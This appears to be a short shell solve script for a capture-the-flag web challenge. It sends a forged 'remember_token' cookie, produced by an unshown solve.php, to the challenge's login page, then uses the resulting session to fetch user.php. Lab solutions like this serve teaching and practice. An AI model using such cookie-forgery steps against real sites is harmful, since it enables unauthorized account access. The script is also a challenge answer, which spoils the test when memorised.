curl "http://${CHALLENGE_HOST}:${CHALLENGE_PORT}/login.php" -b "remember_token=$(php solve.php)" -c cookie
curl "http://${CHALLENGE_HOST}:${CHALLENGE_PORT}/user.php" -b cookie
